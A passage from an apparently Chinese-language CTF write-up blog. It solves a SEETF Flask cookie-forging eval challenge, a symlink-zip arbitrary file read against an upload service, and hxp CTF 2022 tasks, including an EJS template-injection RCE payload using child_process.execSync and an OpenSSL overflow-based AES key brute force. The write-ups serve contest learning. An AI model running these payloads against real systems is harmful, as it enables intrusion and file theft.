<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/福&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fortold</span>():</span><br><span class="line">	keys.clear()</span><br><span class="line">	start = request.form.get(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line">	app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = start</span><br><span class="line">	replace_secret_key()</span><br><span class="line"></span><br><span class="line">	value = [secret(key) <span class="keyword">for</span> key <span class="keyword">in</span> keys]</span><br><span class="line">	result = solve(*value)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">eval</span>(<span class="built_in">chr</span>(result))</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;Bad Luck.&#x27;</span></span><br></pre></td></tr></table></figure>
<p>接受一个key，调用replace_secret_key()，然后将value传入solve，最后eval result</p>
<p>对于replace_secret_key()将会递归一样的使用decrypt_cookie解密cookie，最后在含有end的情况下停止，然后将这几层key传入solve，放回e，之后eval(chr(e))</p>
<p>，那么解题思路就是先找到满足solve函数的字符串，然后递归加密key，传入即可，那么最终要得到的e是<code>福</code>这个字符，因为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>) <span class="keyword">as</span> flag:</span><br><span class="line">	contents = flag.read()</span><br><span class="line">	福 = contents.strip()</span><br></pre></td></tr></table></figure>
<p>那么首先先得到福的数值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ord</span>(<span class="string">&#x27;福&#x27;</span>)==<span class="number">31119</span></span><br></pre></td></tr></table></figure>
<p>然后找到a-f的数值</p>
<p><a href="https://www.wolframalpha.com/input?i=solve+%28a%5E3%29%28b%5E2%2Bc%5E2%29%282d%2B1%29++%3D++%2831119%5E3%29%2B%2888888%5E3%29+over+the+integers+">https://www.wolframalpha.com/input?i=solve+(a^3)(b^2%2Bc^2)(2d%2B1)++%3D++(31119^3)%2B(88888^3)+over+the+integers+</a></p>
<p>需要进行调整，数值整体会偏大</p>
<p><a href="https://www.wolframalpha.com/input?i=solve+%2841%5E3%29%28b%5E2%2Bc%5E2%29%282d%2B1%29++%3D++%2831119%5E3%29%2B%2888888%5E3%29+over+the+integers+">https://www.wolframalpha.com/input?i=solve+(41^3)(b^2%2Bc^2)(2d%2B1)++%3D++(31119^3)%2B(88888^3)+over+the+integers+</a></p>
<p>然后通过脚本获得相应的字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">value</span>):</span><br><span class="line">	random.seed(value)</span><br><span class="line">	<span class="keyword">return</span> random.randint(<span class="number">8</span>, <span class="number">88888</span>)</span><br><span class="line"></span><br><span class="line">values_to_find = [<span class="number">41</span>, <span class="number">1728</span>, <span class="number">803</span>, <span class="number">1463</span>, <span class="number">88888</span>]</span><br><span class="line">found_values = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> combination <span class="keyword">in</span> itertools.product(<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>, repeat=<span class="number">4</span>):</span><br><span class="line">	input_value = <span class="string">&#x27;&#x27;</span>.join(combination)</span><br><span class="line">	result = secret(input_value)</span><br><span class="line">	<span class="keyword">if</span> result <span class="keyword">in</span> values_to_find:</span><br><span class="line">		found_values.append(input_value)</span><br><span class="line">		values_to_find.remove(result)</span><br><span class="line">		<span class="built_in">print</span>(result,input_value)</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> values_to_find:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">//<span class="number">1728</span> aqoi</span><br><span class="line">//<span class="number">1463</span> aucl</span><br><span class="line">//<span class="number">88888</span> bphi</span><br><span class="line">//<span class="number">41</span> cdsn</span><br><span class="line">//<span class="number">803</span> ewmu</span><br></pre></td></tr></table></figure>
<p>然后生成出session</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">SECRET_KEYS = [<span class="string">&quot;cdsn&quot;</span>,<span class="string">&quot;aqoi&quot;</span>,<span class="string">&quot;ewmu&quot;</span>,<span class="string">&quot;aucl&quot;</span>,<span class="string">&quot;bphi&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_cookie</span>(<span class="params">secret_key,index=<span class="number">0</span></span>):</span><br><span class="line">	<span class="keyword">if</span> index == <span class="built_in">len</span>(SECRET_KEYS):</span><br><span class="line">		cmd_out = subprocess.check_output([<span class="string">&#x27;flask-unsign&#x27;</span>, <span class="string">&#x27;--sign&#x27;</span>, <span class="string">&#x27;--cookie&#x27;</span>, <span class="string">&#x27;&#123;&quot;end&quot;: &quot;&#x27;</span> + secret_key + <span class="string">&#x27;&quot;&#125;&#x27;</span>, <span class="string">&#x27;--secret&#x27;</span>, secret_key])</span><br><span class="line">		<span class="keyword">return</span> cmd_out.decode(<span class="string">&#x27;utf-8&#x27;</span>).strip()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		session_hash = generate_cookie(SECRET_KEYS[index], index+<span class="number">1</span>)</span><br><span class="line">		cmd_out = subprocess.check_output([<span class="string">&#x27;flask-unsign&#x27;</span>, <span class="string">&#x27;--sign&#x27;</span>, <span class="string">&#x27;--cookie&#x27;</span>, <span class="string">&#x27;&#123;&quot;key&quot;: &quot;&#x27;</span> + SECRET_KEYS[index] + <span class="string">&#x27;&quot;,&quot;session&quot;:&quot;&#x27;</span> + session_hash + <span class="string">&#x27;&quot;&#125;&#x27;</span>, <span class="string">&#x27;--secret&#x27;</span>, secret_key])</span><br><span class="line">		<span class="keyword">return</span> cmd_out.decode(<span class="string">&#x27;utf-8&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line">cookie = &#123;<span class="string">&#x27;session&#x27;</span> : generate_cookie(SECRET_KEYS[<span class="number">0</span>])&#125;</span><br><span class="line">data = &#123;<span class="string">&quot;key&quot;</span>:<span class="string">&#x27;cdsn&#x27;</span>&#125;</span><br><span class="line">response = requests.post(<span class="string">&#x27;http://福.web.seetf.sg:1337/%E7%A6%8F&#x27;</span>, cookies=cookie, data=data, proxies=&#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://localhost:8080&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">cdsn:41</span></span><br><span class="line"><span class="string">aqoi:1728</span></span><br><span class="line"><span class="string">ewmu:803</span></span><br><span class="line"><span class="string">aucl:1463</span></span><br><span class="line"><span class="string">bphi:88888</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="Throw-your-malware-here">Throw your malware here!</h2>
<p>后端代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pefile</span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, HTTPException, UploadFile</span><br><span class="line"><span class="keyword">from</span> fastapi.responses <span class="keyword">import</span> JSONResponse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FILE_CACHE = Path(<span class="string">&quot;/app/cache&quot;</span>)</span><br><span class="line">FLOSS_PATH = Path(<span class="string">&quot;/usr/local/bin/floss&quot;</span>)</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_random_string</span>(<span class="params">length: <span class="built_in">int</span> = <span class="number">16</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="comment"># choose from all lowercase letter</span></span><br><span class="line">    letters = string.ascii_lowercase</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(random.choice(letters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.on_event(<span class="params"><span class="string">&quot;startup&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">startup</span>():</span><br><span class="line">    <span class="comment"># Ensure caches exist</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> FILE_CACHE.is_dir():</span><br><span class="line">        FILE_CACHE.mkdir()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_floss</span>(<span class="params">target: Path</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    args = [<span class="built_in">str</span>(target), <span class="string">&quot;--json&quot;</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pefile.PE(name=<span class="built_in">str</span>(target))</span><br><span class="line">    <span class="keyword">except</span> pefile.PEFormatError:</span><br><span class="line">        args.extend((<span class="string">&quot;--only&quot;</span>, <span class="string">&quot;static&quot;</span>))</span><br><span class="line">    output = subprocess.check_output((FLOSS_PATH, *args))</span><br><span class="line">    <span class="keyword">return</span> output.decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/floss&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">floss_endpoint</span>(<span class="params">sample: UploadFile, password: <span class="type">Optional</span>[<span class="built_in">str</span>]</span>) -&gt; JSONResponse:</span><br><span class="line">    random_path = get_random_string()</span><br><span class="line">    <span class="keyword">while</span> (target_path := FILE_CACHE / random_path).exists():</span><br><span class="line">        random_path = get_random_string()</span><br><span class="line">    <span class="keyword">with</span> target_path.<span class="built_in">open</span>(<span class="string">&quot;wb+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        shutil.copyfileobj(sample.file, f)</span><br><span class="line">    is_zipfile = zipfile.is_zipfile(target_path)</span><br><span class="line">    <span class="keyword">if</span> is_zipfile:</span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(target_path) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="comment"># No zip bombs!</span></span><br><span class="line">            file_size_sum = <span class="built_in">sum</span>(data.file_size <span class="keyword">for</span> data <span class="keyword">in</span> f.filelist)</span><br><span class="line">            compressed_size_sum = <span class="built_in">sum</span>(data.compress_size <span class="keyword">for</span> data <span class="keyword">in</span> f.filelist)</span><br><span class="line">            <span class="keyword">if</span> (file_size_sum / compressed_size_sum &gt; <span class="number">10</span>):</span><br><span class="line">                <span class="keyword">raise</span> HTTPException(<span class="number">413</span>, <span class="string">&quot;Zip Bomb Detected&quot;</span>)</span><br><span class="line"></span><br><span class="line">            zipobjects = f.infolist()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(zipobject.file_size &gt; <span class="number">50000</span> <span class="keyword">for</span> zipobject <span class="keyword">in</span> zipobjects):</span><br><span class="line">                <span class="keyword">raise</span> HTTPException(<span class="number">418</span>, <span class="string">&quot;I&#x27;m a teapot!&quot;</span>)</span><br><span class="line">            files = f.namelist()</span><br><span class="line">        args = [<span class="string">&quot;unzip&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> password:</span><br><span class="line">            args.extend((<span class="string">&quot;-P&quot;</span>, password))</span><br><span class="line">        args.extend((<span class="built_in">str</span>(target_path), <span class="string">&quot;-d&quot;</span>, <span class="string">f&quot;<span class="subst">&#123;FILE_CACHE / random_path&#125;</span>-zip&quot;</span>))</span><br><span class="line">        a = subprocess.run(args)</span><br><span class="line">        <span class="keyword">if</span> a.returncode != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> HTTPException(<span class="number">422</span>, <span class="string">&quot;Invalid password!&quot;</span>)</span><br><span class="line">        targets = [FILE_CACHE / <span class="string">f&quot;<span class="subst">&#123;random_path&#125;</span>-zip&quot;</span> / file <span class="keyword">for</span> file <span class="keyword">in</span> files]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        targets = [target_path]</span><br><span class="line">    results = [run_floss(target) <span class="keyword">for</span> target <span class="keyword">in</span> targets]</span><br><span class="line">    <span class="keyword">return</span> JSONResponse(</span><br><span class="line">        &#123;target.name: result <span class="keyword">for</span> target, result <span class="keyword">in</span> <span class="built_in">zip</span>(targets, results)&#125;</span><br><span class="line">        <span class="keyword">if</span> is_zipfile</span><br><span class="line">        <span class="keyword">else</span> results[<span class="number">0</span>]</span><br><span class="line">    )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>floss路由允许我们上传一个具有密码的zip文件，然后使用unzip解压文件，将每一个文件调用 FLOSS 来执行分析。输出作为 JSON 响应返回。那么使用zipslip漏洞就可以实现任意文件读取</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s ../../../etc/flag flag.link</span><br><span class="line">zip -P flag --symlink flag.zip flag.link</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义要上传的文件</span></span><br><span class="line">files = &#123;<span class="string">&#x27;sample&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;flag.zip&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送POST请求</span></span><br><span class="line">response = requests.post(<span class="string">&#x27;http://ip:port/floss?password=flag&#x27;</span>, files=files)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印响应内容</span></span><br><span class="line"><span class="built_in">print</span>(response.status_code)</span><br><span class="line"><span class="built_in">print</span>(response.json())</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>2023wp</category>
      </categories>
      <tags>
        <tag>2023ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2023hxpctf复现</title>
    <url>/2023/03/13/20-17-27/</url>
    <content><![CDATA[<h1>2023hxpctf</h1>
<span id="more"></span>
<h2 id="web">web</h2>
<h3 id="valentine">valentine</h3>
<p>该题是一个ejs模板注入，根据官方wp，灵感来源于<a href="https://eslam.io/posts/ejs-server-side-template-injection-rce/">https://eslam.io/posts/ejs-server-side-template-injection-rce/</a></p>
<p>整个链子是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;touch /tmp/pwned&#x27;)</span><br></pre></td></tr></table></figure>
<p>当时chatgpt直接给我了一个链子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(&#x27;child_process&#x27;).exec(&#x27;ls -la&#x27;, function(error, stdout, stderr) &#123; console.log(stdout) &#125;</span><br></pre></td></tr></table></figure>
<p>但是我绕不过&lt;%=name %&gt;这个东西，需要使用delimiter更改分隔符</p>
<p><a href="https://www.youtube.com/watch?v=diln4KD57xA">https://www.youtube.com/watch?v=diln4KD57xA</a></p>
<p><img src="/img/2023-03-13203355.png" alt="2023-03-13 203355" /></p>
<p><a href="https://hxp.io/blog/101/hxp-CTF-2022-valentine/">https://hxp.io/blog/101/hxp-CTF-2022-valentine/</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;.= global.process.mainModule.constructor._load(`child_process`).execSync(`/readflag`).toString() .&gt;</span><br></pre></td></tr></table></figure>
<p>官方wp中使用-，我不清楚是不是有什么讲究，一般按原理来说是=</p>
<p>传入的是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delimite=.</span><br></pre></td></tr></table></figure>
<p>原理分析</p>
<p>根据<a href="https://eslam.io/posts/ejs-server-side-template-injection-rce/%E4%B8%AD%E7%9A%84">https://eslam.io/posts/ejs-server-side-template-injection-rce/中的</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var _OPTS_PASSABLE_WITH_DATA = [&#x27;delimiter&#x27;, &#x27;scope&#x27;, &#x27;context&#x27;, &#x27;debug&#x27;, &#x27;compileDebug&#x27;,</span><br><span class="line">  &#x27;client&#x27;, &#x27;_with&#x27;, &#x27;rmWhitespace&#x27;, &#x27;strict&#x27;, &#x27;filename&#x27;, &#x27;async&#x27;];</span><br></pre></td></tr></table></figure>
<p>这段代码定义了一个名为 <code>_OPTS_PASSABLE_WITH_DATA</code> 的变量，它是一个包含多个字符串元素的数组。</p>
<p>这个数组的元素都是字符串类型的选项名称，用于指定 EJS 模板引擎的渲染选项。这些选项包括：</p>
<ul>
<li><code>delimiter</code>: 用于指定 EJS 模板中的分隔符，默认值为 <code>%</code>。</li>
<li><code>scope</code>: 用于指定模板渲染时的作用域，默认值为 <code>null</code>。</li>
<li><code>context</code>: 用于指定模板渲染时的上下文对象，默认值为 <code>null</code>。</li>
<li><code>debug</code>: 用于指定是否启用调试模式，默认值为 <code>false</code>。</li>
<li><code>compileDebug</code>: 用于指定是否启用编译调试模式，默认值为 <code>undefined</code>。</li>
<li><code>client</code>: 用于指定是否生成客户端代码，默认值为 <code>false</code>。</li>
<li><code>_with</code>: 用于指定是否将数据对象添加到作用域链中，默认值为 <code>true</code>。</li>
<li><code>rmWhitespace</code>: 用于指定是否删除标签间的空格和换行符，默认值为 <code>false</code>。</li>
<li><code>strict</code>: 用于指定是否启用严格模式，默认值为 <code>false</code>。</li>
<li><code>filename</code>: 用于指定模板的文件名，默认值为 <code>undefined</code>。</li>
<li><code>async</code>: 用于指定是否异步执行模板渲染，默认值为 <code>false</code>。</li>
</ul>
<p>这些选项可以在调用 EJS 模板引擎的 <code>render</code> 或 <code>compile</code> 方法时进行设置，以便根据需要自定义模板引擎的行为。在get传参中可以直接使用，就像debug=true就会进入ejs的调试</p>
<p>这题分析过程中，delimiter作为用于指定 EJS 模板中的分隔符的标识，就能够利用将本来无法生成模板的<code>&lt;$ ... $&gt;</code>的$转变为模板，然后使用RCE链子获得注入</p>
<h2 id="misc">misc</h2>
<h3 id="Secure-Flag-Dispenser">Secure-Flag-Dispenser</h3>
<p>只有一道题目的misc，其中涉及了逆向，密码和dns反向查找</p>
<p>逆向不会，导致算法不知道是个啥，dns查找也是第一次听说，就简单记录一下官方思路：</p>
<p><a href="https://hxp.io/blog/106/hxp-CTF-2022-Secure-Flag-Dispenser/">https://hxp.io/blog/106/hxp-CTF-2022-Secure-Flag-Dispenser/</a></p>
<p>二进制文件逆向出来的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将标志和预共享密钥读psk入内存</span><br><span class="line">在端口 42424 上设置监听套接字并接受一个连接</span><br><span class="line">检查客户端是否从 🔒.hxp.io 连接</span><br><span class="line">如果是，则使用pskAES 密钥加密标志并将其发送给客户端</span><br><span class="line">如果不是，用教科书RSA包装随机生成的密钥，将包装密钥和AES加密标志发送给客户端</span><br></pre></td></tr></table></figure>
<p>具体来说，首先将flag，psk读取到内存中</p>
<p>然后创建了一个套接字（socket），设置了套接字选项，将套接字绑定到一个IP地址和端口号，监听传入的连接请求，接受一个传入的连接请求，并使用getentropy函数生成16个随机字节。</p>
<p>然后使用getnameinfo函数将网络地址转换为主机名，并将其与字符串“<a href="http://xn--lv8h.hxp.io">🔒.hxp.io</a>”进行比较。如果比较成功，代码将初始化几个变量，包括AES加密的密钥，并在CBC模式下使用AES加密对硬编码字符串“hxp{n0t_4_fl4g}”进行加密。然后将加密结果打印到套接字。 如果比较失败，代码会为RSA加密初始化几个变量，将十六进制字符串转换为RSA对象，并执行RSA加密。</p>
<p>使用BN_bin2bn（）将16个随机字节的randbytes数组转换为一个大整数msg。然后它使用BN_mod_exp（）执行模幂运算，用公钥（rsa_e，rsa_n）加密msg。 生成的加密消息enc_msgenc_msg_bs使用BN_bn2hex（）转换为十六进制字符串，并使用dprintf（）打印到控制台。 接下来，使用AES_set_encrypt_key（）从randbytes派生128位AES密钥，并使用带有该密钥的AES-CBC对明文消息“hxp{n0t_4_fl4g}”进行加密，并作为十六进制字符串打印到控制台。 最后，使用OpenSSL函数OPENSSL_free（）和BN_free（）释放所有分配的内存，该函数返回0。它还将一些内存位置设置为零，并在返回之前写入文件描述符。</p>
<p>二进制文件的行为取决于客户端是从 <a href="http://xn--lv8h.hxp.io">🔒.hxp.io</a> 还是从其他地方连接。根据<code>getnameinfo(3)</code>函数，它通过执行反向 DNS 查找来实现。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dig -x 92.243.26.60</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.12-1-Debian &lt;&lt;&gt;&gt; -x 92.243.26.60</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 12079</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line">dig: &#x27;xn--ls8haaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.xn--ls8haaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.xn--ls8haaaaaaaaaaaaaa.xn--a.xn--a.xn--a.xn--a.xn--a.xn--a.xn--a.xn--a.xn--a.xn--a.xn--a.xn--a.xn--a.xn--a.kirschju.re.&#x27; is not a legal IDNA2008 name (string contains a disallowed character), use +noidnout</span><br></pre></td></tr></table></figure>
<p>利用 OpenSSL CVE CVE-2022-3602 和 CVE-2022-3786。其中之一允许使用（点）字符溢出 OpenSSL 中的堆栈分配缓冲区<code>.</code>。当将来自反向 DNS 请求的值插入易受攻击的程序时，可以看到<code>randbytes</code>堆栈帧最顶部（1680 字节）的变量<code>.</code>几乎完全被 s 覆盖。这意味着我们知道用于加密发送给客户端的标志的 AES 密钥！</p>
<p><strong>这里没看懂</strong></p>
<p>知识点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getnameinfo（3）函数用于以与协议无关的方式将套接字地址转换为相应的主机和服务。它与getaddrinfo（3）函数相反，后者用于执行相反的转换（将主机和服务转换为套接字地址）。</span><br><span class="line"></span><br><span class="line">dig可以用于反向 DNS 查找</span><br></pre></td></tr></table></figure>
<p>最后的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"></span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">enc = bytes.fromhex(&quot;e86ff18a103d528ac01d0fbba5d55491f678ee3a7c6dd53135243ddf2e7852b7daa32347eaad1c6c869d6d569e366578c0a442da2e091a24eed12b1e7772a9fb&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># We need to recover three bytes from the AES key</span><br><span class="line">for i in range(2**24):</span><br><span class="line">    k = b&quot;.&quot; * 13 + int.to_bytes(i, 3, &quot;little&quot;)</span><br><span class="line">    aes = AES.new(k, iv = b&quot;hxp&#123;n0t_4_fl4g&#125;\x00&quot;, mode = AES.MODE_CBC)</span><br><span class="line">    dec = aes.decrypt(enc)</span><br><span class="line">    if b&quot;hxp&quot; in dec:</span><br><span class="line">        print(dec)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">k = b&quot;.&quot; * 13 + int.to_bytes(i, 3, &quot;little&quot;)</span><br></pre></td></tr></table></figure>
<p>一个是缓冲区溢出，加上拼接的密钥，暴力破解</p>
<p>enc通过pcap文件可以在tcp流中找到</p>
<p>很难啊，二进制太薄弱了。</p>
<h2 id="crypto">crypto</h2>
<h3 id="yor">yor</h3>
<p>一共两种解法</p>
<p>当然都需要大量的数据，申请得到最长的密文*50</p>
<p>第一种利用z3约束器，限制明文是0x20到0x70，然后增加用密钥按位或运算与密文得到明文的条件得到明文（麻烦，而且不一定对）</p>
<p>第二种很简单，本质上密钥和明文进行的是或运算，不是异或运算（看本质）</p>
<p>所以可以利用只有0|0才会是0的情况，在按或运算中如过明文位上出现1，绝对就是1，0有可能是0或者1</p>
<p>那么使用与运算只有1&amp;1才会是1的情况，可以利用大量的加密数据爆破出明文</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cts = [bytes.fromhex(a.decode()) for a in enc]</span><br><span class="line"></span><br><span class="line">out = [0xFF] * len(cts[0])</span><br><span class="line">print(out)</span><br><span class="line">for i in range(len(cts[0])):</span><br><span class="line">    for ct in cts:</span><br><span class="line">        out[i] &amp;= ct[i]</span><br><span class="line"></span><br><span class="line">print(&quot;&quot;.join([chr(c) for c in out]))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>另外，说一下本地利用pwnlib获取静态的crypto环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import pwnlib.tubes.process</span><br><span class="line">import pwnlib.tubes.remote</span><br><span class="line">a=pwnlib.tubes.process.process(&#x27;./vuln.py&#x27;)</span><br><span class="line">print(a.recvline())</span><br></pre></td></tr></table></figure>
<p>这样就可以相当于开了pwn的本地环境了</p>
<p>然后还可以利用bash运行存储数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in $(seq 1 50); do python you_exp.py; done &gt; out.txt</span><br></pre></td></tr></table></figure>
<p>本题需要得到固定长度的密文，这样才能确保用同一个明文加密</p>
<h2 id="re">re</h2>
<h3 id="required">required</h3>
<p>第一次写逆向题目，那么简单学习一下，实际上pwn和re是两个方向，但是很多re题目是二进制的所以导致pwn手也是re手。</p>
<p>本题就不是c/c++的逆向，而是js逆向</p>
<p>参考连接：<a href="https://www.52pojie.cn//thread-1759330-1-1.html">https://www.52pojie.cn//thread-1759330-1-1.html</a></p>
<p>docker文件如下，<a href="http://xn--run-u68d63mq92b8iinqv772botmg3f.sh">其中比较重要的是run.sh</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># see docker-compose.yml</span><br><span class="line"></span><br><span class="line">FROM node:19</span><br><span class="line"></span><br><span class="line">RUN useradd --create-home --shell /bin/bash ctf</span><br><span class="line">WORKDIR /home/ctf</span><br><span class="line"></span><br><span class="line">COPY flag files/* /home/ctf/</span><br><span class="line"></span><br><span class="line">USER ctf</span><br><span class="line"></span><br><span class="line">CMD sh run.sh</span><br></pre></td></tr></table></figure>
<p><a href="http://run.sh">run.sh</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">if [ &quot;$(node required.js)&quot; = &quot;0xd19ee193b461fd8d1452e7659acb1f47dc3ed445c8eb4ff191b1abfa7969&quot; ]; then</span><br><span class="line">    echo &quot;:)&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;:(&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p>也就是说如果运行node requird.js = “0xd1…”就会得到flag</p>
<p>再看一下js文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f=[...require(&#x27;fs&#x27;).readFileSync(&#x27;./flag&#x27;)]</span><br><span class="line">require(&#x27;./28&#x27;)(753,434,790)</span><br><span class="line">require(&#x27;./157&#x27;)(227,950,740)</span><br><span class="line">require(&#x27;./736&#x27;)(722,540,325)</span><br><span class="line">require(&#x27;./555&#x27;)(937,26,229)</span><br><span class="line">require(&#x27;./394&#x27;)(192,733,981)</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<p>从flag文件中读取，运行大量的js文件进行加密，也就是说run.sh判断的是密文</p>
<p>问题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 大量的js文件互相调用，难以判断</span><br><span class="line">2. 如何逆出flag</span><br></pre></td></tr></table></figure>
<p>那么跟着加密js慢慢看</p>
<p>28.js</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">module.exports = (i, j, t) =&gt; (</span><br><span class="line">  (i += []),</span><br><span class="line">  j + &quot;&quot;,</span><br><span class="line">  (t = (t + &#123;&#125;).split(&quot;[&quot;)[0]),</span><br><span class="line">  (o = &#123;&#125;),</span><br><span class="line">  Object.entries(require(&quot;./289&quot;)(i, j)).forEach(([K, V]) =&gt;</span><br><span class="line">    Object.entries(V).forEach(([k, v]) =&gt; ((o[K] = o[K] || &#123;&#125;), (o[K][k] = v)))</span><br><span class="line">  ),</span><br><span class="line">  require(`./$&#123;i&#125;`)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>没有存在数据处理，创造了一些对象，调用了289.js，最后返回<code>./$&#123;i&#125;</code></p>
<p>289.js</p>
